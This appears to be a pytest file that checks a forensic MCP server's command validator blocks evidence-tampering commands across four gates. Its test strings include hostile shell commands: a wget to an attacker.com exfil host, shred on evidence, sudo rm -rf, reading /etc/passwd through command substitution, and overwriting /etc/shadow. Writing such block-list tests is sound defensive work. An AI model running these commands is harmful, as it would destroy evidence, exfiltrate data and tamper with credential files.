"""
Spoliation gate tests — verify that the MCP validator blocks evidence-tampering
commands at the correct gate before any subprocess executes.

Each test names the gate expected to fire and asserts the command is rejected.
All four gates are covered:
  Gate 1 — 22 hard-blocked tokens (destructive, exfil, injection, privilege)
  Gate 2 — 53-binary SIFT allowlist (+ python3 -c, find -exec, xargs guards)
  Gate 3 — write-target guard (all > >> tee targets must land in reports/)
  Gate 4 — quote-aware pipe parser (| inside quoted args not treated as separator)

Running: pytest tests/test_spoliation.py -v
"""

from __future__ import annotations

import importlib
import os
import sys
import pytest

# ---------------------------------------------------------------------------
# Import the validator directly from sift_server without starting the MCP
# server process.  sift_server uses module-level globals (_LAYER, _REPORTS)
# that default to safe values on import.
# ---------------------------------------------------------------------------
sys.path.insert(0, os.path.join(os.path.dirname(__file__), '..', 'custom-agent'))
_sv = importlib.import_module('sift_server')
_validate = _sv._validate_command


def _blocked(cmd: str) -> bool:
    ok, _ = _validate(cmd)
    return not ok


def _reason(cmd: str) -> str:
    _, reason = _validate(cmd)
    return reason


# ── Gate 1: Hard-blocked tokens ─────────────────────────────────────────────

def test_gate1_shred_blocked():
    """Evidence destruction: shred must be caught before any parsing."""
    assert _blocked('shred /mnt/nfury/pagefile.sys')
    assert 'hard-blocked' in _reason('shred /mnt/nfury/pagefile.sys')


def test_gate1_wget_exfil_blocked():
    """Data exfiltration via wget must be hard-blocked."""
    assert _blocked('wget http://attacker.com/exfil -O /tmp/out')
    assert 'hard-blocked' in _reason('wget http://attacker.com/exfil -O /tmp/out')


def test_gate1_sudo_blocked():
    """Privilege escalation via sudo must be hard-blocked."""
    assert _blocked('sudo rm -rf /mnt/nfury')
    assert 'hard-blocked' in _reason('sudo rm -rf /mnt/nfury')


def test_gate1_command_substitution_blocked():
    """Command injection via $() must be hard-blocked before parsing."""
    cmd = 'echo $(cat /etc/passwd)'
    assert _blocked(cmd)
    assert 'hard-blocked' in _reason(cmd)


def test_gate1_backtick_substitution_blocked():
    """Command injection via backtick substitution must be hard-blocked."""
    cmd = 'strings `which bash`'
    assert _blocked(cmd)
    assert 'hard-blocked' in _reason(cmd)


# ── Gate 2: Binary allowlist ─────────────────────────────────────────────────

def test_gate2_bash_not_in_allowlist():
    """bash is not a forensic binary and must be rejected by the allowlist."""
    assert _blocked('bash -c "rm /mnt/nfury/evidence.e01"')
    assert 'allowlist' in _reason('bash -c "rm /mnt/nfury/evidence.e01"')


def test_gate2_python3_inline_exec_blocked():
    """python3 -c (inline execution) is explicitly blocked even though python3 is allowed."""
    cmd = "python3 -c 'import os; os.remove(\"/mnt/evidence\")'"
    assert _blocked(cmd)
    assert '-c' in _reason(cmd)


def test_gate2_find_exec_rm_blocked():
    """find -exec with a non-allowlisted binary (rm) must be caught by the exec guard."""
    cmd = 'find /mnt/nfury -name "*.log" -exec rm {} \\;'
    assert _blocked(cmd)
    assert 'allowlist' in _reason(cmd)


def test_gate2_xargs_rm_blocked():
    """xargs piped to rm must be caught by the xargs command guard."""
    cmd = 'find /mnt/nfury -name "*.evtx" | xargs rm'
    assert _blocked(cmd)
    assert 'allowlist' in _reason(cmd)


# ── Gate 3: Write-target (redirect) guard ────────────────────────────────────

def test_gate3_redirect_outside_reports_blocked():
    """Output redirected to /tmp must be blocked — only reports/ is permitted."""
    cmd = 'strings /mnt/nfury/Windows/System32/ntoskrnl.exe > /tmp/strings_out.txt'
    assert _blocked(cmd)
    assert 'redirection' in _reason(cmd) or 'resolves outside' in _reason(cmd)


def test_gate3_redirect_to_etc_blocked():
    """Output redirected to /etc (e.g. /etc/passwd overwrite) must be blocked."""
    cmd = 'cat /mnt/nfury/Windows/System32/config/SAM > /etc/shadow'
    assert _blocked(cmd)


def test_gate3_audit_log_write_blocked():
    """Writing directly to audit_log.jsonl via redirect must be explicitly blocked."""
    cmd = 'echo "fake finding" > reports/audit_log.jsonl'
    assert _blocked(cmd)
    reason = _reason(cmd)
    assert 'audit_log' in reason or 'redirection' in reason


# ── Gate 4 / Gate 2 interaction: Quote-aware pipeline parser ─────────────────

def test_gate4_pipe_inside_quotes_not_split():
    """
    grep -iE '(http|https|ftp)' is a valid forensic command.
    The | characters are inside single quotes and must NOT be treated as pipeline
    separators — otherwise 'https' and 'ftp)' would be rejected as unlisted binaries.
    The command must pass the parser correctly and be allowed.
    """
    cmd = "grep -iE '(http|https|ftp)' /mnt/nfury/Windows/System32/config/SYSTEM"
    ok, reason = _validate(cmd)
    assert ok, f"Legitimate grep with | in quoted arg was wrongly blocked: {reason}"
